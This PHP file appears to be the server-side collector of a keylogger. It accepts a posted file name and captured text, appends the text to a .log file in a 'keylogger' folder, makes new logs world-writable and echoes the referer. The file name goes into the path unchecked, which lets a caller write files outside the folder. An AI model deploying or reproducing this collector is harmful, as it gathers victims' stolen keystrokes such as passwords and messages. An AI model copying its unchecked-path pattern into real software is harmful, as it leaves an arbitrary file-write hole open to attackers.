<?php
$static='./keylogger/';
$file_name=$_POST['filename'];

$log_line=$_POST['logtext'];

$LogFilePath=$static.$file_name.".log";

if(file_exists($LogFilePath)){
	$file_status="a";
}

else {
	$file_status="w";
}



$save_logtxt=fopen($LogFilePath,$file_status);


print $_SERVER['HTTP_REFERER'];





#save_logtxt;
#$log_line;
fwrite($save_logtxt,$log_line);

#print $file_status;
#print $LogFilePath;

if($file_status==='w'){
chmod($LogFilePath,0666);

}

fclose($save_logtxt);




?>






